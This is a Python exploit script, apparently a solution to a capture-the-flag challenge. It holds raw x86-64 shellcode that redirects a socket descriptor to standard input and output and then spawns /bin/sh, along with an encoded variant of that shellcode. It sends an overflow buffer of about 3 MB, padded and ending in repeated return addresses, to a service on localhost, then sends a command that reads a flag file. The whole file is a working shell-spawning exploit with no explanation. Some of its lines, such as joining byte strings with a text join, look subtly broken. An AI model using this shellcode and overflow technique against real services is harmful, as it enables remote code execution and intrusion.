import socket
import struct
import time

orig_shellcode = ''.join([
    b'\xcc',
    b'\x48\x31\xff',
    b'\x48\x31\xc0',
    b'\x48\x31\xd2',
    b'\x48\x31\xf6',
    b'\xb0\x21',
    b'\x66\xbf\x04\x00',
    b'\x66\xbe\x00\x00',
    b'\x0f\x05',
    b'\x48\x31\xc0',
    b'\xb0\x21',
    b'\x66\xbe\x01\x00',
    b'\x0f\x05',
    b'\x48\x31\xc0',
    b'\xb0\x21',
    b'\x66\xbe\x02\x00',
    b'\x0f\x05',
    b'\x66\x6a\x68',
    b'\x66\x68\x2f\x73'

    b'\x66\x68\x69\x6e',
    b'\x66\x68\x2f\x62',

    b'\x48\x89\xe7',
    b'\x48\x31\xc0',
    b'\xb0\x3b',
    b'\x48\x31\xf6',
    b'\x48\x31\xd2',
    b'\x0f\x05'
])

new_shellcode = ''.join([
    # b'\xcc\xa4\x15',
    b'\xdc\xff\xcd',
    b'\xa6\xc0\x9b',
    b'\xb5\xd2\xa9'
    b'\xd4\xf6\xc6',
    b'\x80\x7d\x90',  # b'\xb0\x21',
    b'\x7e\xc7\x60\xe4\xca\xc7',
    b'\x5e\x3f\x91\x0c\x0f\x01\xe4\xcb\xc7', # b'\x0f\x05'
    b'\xa6\xc0\x9b',
    b'\x80\x7d\x90',  # b'\xb0\x21',
    b'\x60\xc6\x8c\xe4\xc8\xc7',
    b'\x5e\x3f\x91\x0c\x0f\x01\xe4\xcb\xc7', # b'\x0f\x05'
    b'\xa6\xc0\x9b',
    b'\x80\x7d\x90',  # b'\xb0\x21',
    b'\x7e\xc6\x60\xe4\xc9\xc7',
    b'\x5e\x3f\x91\x0c\x0f\x01\xe4\xcb\xc7', # b'\x0f\x05'
    b'\x66\x55\x19\x55\x90\x74',
    b'\x3e\x57\x68\x88\x90\x4f'
    b'\x3e\x69\x50\x13\x2c\x22\xe4\xc7\xc7',
    b'\x3e\x57\x68\x2a\x2c\x1b\xe4\xc7\xc7',
    b'\x8f\xe7\x6a',
    b'\xa6\xc0\x9b',
    b'\xb0\x8d\x12\xd8\xe4\xc7',
    b'\xd4\xf6\xc6',
    b'\xb5\xd2\xa9',
    b'\x5e\x3f\x91\x0c\x0f\x01\xe4\xcb\xc7', # b'\x0f\x05'
])



def main():
    buf = new_shellcode + b'A' * (3000000 - len(new_shellcode)) \
          + b'A' * 4 + struct.pack('<Q', 0x404100) * 3
    if len(buf) % 3 == 1:
        buf = buf + b'A' * 2
    elif len(buf) % 3 == 2:
        buf = buf + b'A' * 1
    assert len(buf) % 3 == 0
    print(len(buf))
    s = socket.socket()
    s.connect(('localhost', 37123))
    s.sendall(struct.pack('>I', len(buf) // 3))
    s.sendall(buf)

    recv_count = 0

    while recv_count < len(buf):
        print('here')
        recv_count += len(s.recv(len(buf) - recv_count))

    print('Done receiving')

    while True:
        time.sleep(1)
        s.sendall(b'cat /color/flag.txt\n')
        time.sleep(1)
        print(s.recv(4096))


if __name__ == '__main__':
    main()
